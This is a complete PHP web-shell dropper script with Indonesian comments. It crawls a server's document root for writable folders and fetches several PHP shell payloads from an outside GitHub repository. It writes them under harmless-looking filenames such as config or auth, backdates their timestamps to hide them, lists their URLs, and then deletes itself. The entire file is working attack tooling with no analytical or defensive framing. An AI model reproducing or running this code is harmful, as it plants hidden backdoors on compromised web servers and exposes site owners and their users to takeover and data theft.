<?php
set_time_limit(30); // Reduce from unlimited to 30 seconds
error_reporting(E_ALL);
ini_set('display_errors', '1');

define('MAX_SPREAD', 15); // Reduce from 10 to 5
define('DEPLOY_PROBABILITY', 25); // Increase from 15 to 25
define('MAX_DEPTH', 5); // Add depth limit
define('MAX_SCAN_TIME', 20); // Maximum time for scanning

$target_names = [
    'index','main','default','common','user','client','server','config','setting','setup',
    'init','start','connect','service','adminpanel','session','coredata','database','access','auth',
    'module','plugin','theme','mediafile','controller','router','loader','uploader','downloader','backupdata',
    'restorepoint','staticfile','publicdata','privatefile','account','userinfo','profile','security','log','history',
    'analytics','statistics','document','editorfile','helper','vendorfile','package','library','asset','imagefile',
    'video','resourcefile','templatefile','response','request','handler','middleware','webhook','endpoint','proxyserver',
    'cloudsync','cdnfile','tempfile','cacheddata','sessionstore','token','datastream','record','report','schedule',
    'taskrunner','jobmanager','queue','eventdispatcher','listener','subscriber','notifier','alertsystem','monitor','checker',
    'updater','installer','remover','patcher','frameworkfile','phpfile','htmlfile','cssfile','jsfile','xmlfile',
    'jsondata','txtfile','markdown','readme','changelog','licensefile','apihelper','sdkfile','pluginhelper','themehelper',
    'env','credential','tokenfile','syncer','migrator','logrotate','debugfile','analyzer','heartbeat','watchdog',
    'inspector','auditor','scripter','compiler','builder','minifier','packager','resolver','verifier','authenticator',
    'validator','scanner','scannerbot','parser','jsonparser','xmlparser','csvparser','yamlparser','inihelper','formatter',
    'reformatter','converter','transcoder','translator','localizer','emailer','mailer','smtphelper','mailqueue','mailreport',
    'dashboard','panel','frontend','backend','apiendpoint','apitoken','apikey','apiuser','apiclient','apitester',
    'docgen','swaggerfile','swaggergen','postmanfile','openapifile','firewall','ruleset','whitelist','blacklist','blocklist',
    'accesslist','sessionid','sessionlock','cookiemanager','cookiehandler','csrfprotector','xssfilter','sanitizer','inputcleaner','queryfilter',
    'sqlrunner','sqlquery','dbmanager','dbschema','dbsync','dbdump','dbrestore','dbmigrate','dbconfig','dbconnector',
    'ftpfile','ftpserver','sftphelper','sshkey','sslcert','certbot','certrenew','acmefile','cronjob','cronfile',
    'scheduler','jobqueue','taskqueue','batchrunner','clihelper','cmdhelper','terminal','console','clitool','cliscript',
    'dependency','requirement','composerfile','npmfile','yarnfile','packagejson','packagelock','gitconfig','gitignore','gitrepo',
    'gitclone','gitpull','gitpush','commitlog','tagfile','releasefile','deployfile','cihelper','ciconfig','cistatus',
    'dockerset','dockerfile','containerfile','composefile','containerlog','registryfile','envvar','dotenv','envconfig','envsample',
    'portchecker','networkscan','nmapresult','portlist','ipconfig','dnschecker','whoislookup','tracefile','pingresult','latencylog',
    'uptimelog','downtimelog','statlogger','applogger','usertracker','visitlog','trafficlog','seohelper','metatags','robotsfile',
    'sitemapfile','hreflang','canonicalurl','urlmanager','slugger','permalink','urlrewriter','htaccess','nginxconf','apacheconf',
    'webconfig','iisconfig','hostfile','vhostfile','dnsrecord','nslookup','domaininfo','registrarinfo','expiration','whoisinfo',
    'cdnconfig','cloudflare','edgeserver','edgecache','originserver','loadbalancer','sslchecker','tlsverifier','certchecker','fingerprint',
    'jwtgenerator','jwtparser','jwtverifier','hashgenerator','md5hash','sha1hash','sha256hash','bcrypt','argon2','hashverifier',
    'cachecontrol','redisconfig','memcache','objectcache','pagecache','minifyjs','minifycss','compressimg','gzipfile','brotlifile',
    'imageoptimizer','imagecompressor','videoconverter','videocompressor','thumbnailer','previewer','galleryview','carouselitem','slideshow','lightbox',
    'mediaplayer','videoplayer','audioplayer','playlistfile','streamfile','streamurl','streamkey','tokenauth','securestream','hlsfile',
    'dashfile','manifestfile','livestream','vodfile','vodstream','transcoderfile','drmhelper','licensekey','serialkey','activationfile',
    'activationkey','trialchecker','licensemanager','regkeyfile','expirationfile','securitykey','pinfile','lockfile','unlocked','secured',
    'gatekeeper','firewallrule','vpnfile','sshconfig','openvpn','iptables','portsentry','netwatch','ipban','fail2ban',
    'adminaccess','superuser','rootaccess','sudofile','userprivilege','permissionfile','aclfile','groupconfig','rolefile','permissionmap'
];

$remote_urls = [
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/tunnel.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/tuns.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/404.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/avril.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-idp.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-sep-gambar.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-xml.php',
];

function fetchPayload($url) {
    // PHP 5+ compatible - removed string type hint
    if (ini_get('allow_url_fopen')) {
        // Check if stream_context_create exists (PHP 4.3+)
        if (function_exists('stream_context_create')) {
            $context = stream_context_create(array(
                'http' => array(
                    'timeout' => 5,
                    'method' => 'GET',
                    'header' => 'User-Agent: Mozilla/5.0'
                )
            ));
            $data = @file_get_contents($url, false, $context);
        } else {
            $data = @file_get_contents($url);
        }
        if ($data !== false && trim($data) !== '') return $data;
    }
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        // Use array() instead of [] for PHP 5.3 compatibility
        $curl_options = array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT         => 5,
            CURLOPT_CONNECTTIMEOUT  => 3,
        );
        curl_setopt_array($ch, $curl_options);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false && trim($data) !== '') return $data;
    }
    return false;
}

function getWritableFolders($dir, &$grouped, $depth = 0) {
    if ($depth > MAX_DEPTH) return; // Add depth limit
    if (time() - $GLOBALS['start_time'] > MAX_SCAN_TIME) return; // Time limit
    
    $items = @scandir($dir);
    if (!$items) return;
    
    $count = 0;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        if (++$count > 20) break; // Limit items per directory
        
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($full)) {
            @chmod($full, 0755);
            $document_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
            $relative_path = str_replace($document_root, '', $full);
            $path_parts = explode(DIRECTORY_SEPARATOR, trim($relative_path, DIRECTORY_SEPARATOR));
            $top = isset($path_parts[0]) ? $path_parts[0] : 'root';
            
            if (!isset($grouped[$top])) $grouped[$top] = array();
            if (is_writable($full)) $grouped[$top][] = $full;
            getWritableFolders($full, $grouped, $depth + 1);
        }
    }
}

echo "<!-- Starting deployment -->\n";
$start_time = time(); // Track start time

$document_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
$base_dir = rtrim($document_root, '/');
$grouped_folders = array();
getWritableFolders($base_dir, $grouped_folders);

// Pre-fetch all available payloads - PHP 5+ compatible
$available_payloads = array();
// Shuffle function for PHP 5+ compatibility
if (function_exists('shuffle')) {
    shuffle($remote_urls);
}
foreach ($remote_urls as $url) {
    $content = fetchPayload($url);
    if ($content !== false && trim($content) !== '') {
        $available_payloads[] = $content;
        echo "<!-- Payload loaded from: " . basename($url) . " -->\n";
    }
}

if (empty($available_payloads)) {
    echo "<!-- No payloads available -->\n";
    exit;
}

echo "<!-- Total payloads loaded: " . count($available_payloads) . " -->\n";

$spread_count = 0;
$group_keys = array_keys($grouped_folders);
if (function_exists('shuffle')) {
    shuffle($group_keys);
}

while ($spread_count < MAX_SPREAD && count($group_keys) > 0 && time() - $start_time < 25) {
    foreach ($group_keys as $group) {
        if ($spread_count >= MAX_SPREAD || time() - $start_time > 25) break;
        
        $folders = $grouped_folders[$group];
        if (empty($folders)) continue;
        if (function_exists('shuffle')) {
            shuffle($folders);
        }
        $folder = array_pop($folders);
        $grouped_folders[$group] = $folders;

        // Use mt_rand or rand based on availability
        $random_num = function_exists('mt_rand') ? mt_rand(1, 100) : rand(1, 100);
        if ($random_num > DEPLOY_PROBABILITY) continue;
        if (!is_writable($folder)) continue;

        if (function_exists('shuffle')) {
            shuffle($target_names);
        }
        $name = $target_names[0];
        $full_path = $folder . '/' . $name . '.php';
        if (file_exists($full_path)) continue;

        // Select random payload for each file - PHP 5+ compatible
        $random_key = function_exists('array_rand') ? array_rand($available_payloads) : 0;
        $random_payload = $available_payloads[$random_key];
        
        if (@file_put_contents($full_path, $random_payload) !== false) {
            @chmod($full_path, 0644);

            // PHP 5+ compatible random date generation
            $year = function_exists('mt_rand') ? mt_rand(2010, 2020) : rand(2010, 2020);
            $month = function_exists('mt_rand') ? mt_rand(1, 12) : rand(1, 12);
            $day = function_exists('mt_rand') ? mt_rand(1, 28) : rand(1, 28);
            $hour = function_exists('mt_rand') ? mt_rand(0, 23) : rand(0, 23);
            $min = function_exists('mt_rand') ? mt_rand(0, 59) : rand(0, 59);
            $sec = function_exists('mt_rand') ? mt_rand(0, 59) : rand(0, 59);
            $timestamp = mktime($hour, $min, $sec, $month, $day, $year);
            @touch($full_path, $timestamp, $timestamp);

            $spread_count++;
            $rel = str_replace($base_dir, '', $full_path);
            $https_check = isset($_SERVER['HTTPS']) && !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off';
            $proto = $https_check ? 'https' : 'http';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
            $url = $proto . "://" . $host . str_replace(DIRECTORY_SEPARATOR, '/', $rel);

            echo "<a href=\"" . $url . "\" target=\"_blank\">" . $url . "</a><br>\n";
        }
    }
}

echo "<!-- Deployment complete: " . $spread_count . " files -->\n";

// === Langkah : Hapus File tebarshel.php Sendiri ===  
echo "\nScript tebarshel.php akan dihapus sendiri...\n";
// PHP 5+ compatible file deletion
$current_file = __FILE__;
if (function_exists('unlink') && unlink($current_file)) {
    echo "tebarshel-v3.php telah dihapus.\n";
} else {
    echo "Gagal menghapus tebarshel.php. Harap hapus secara manual.\n";
}
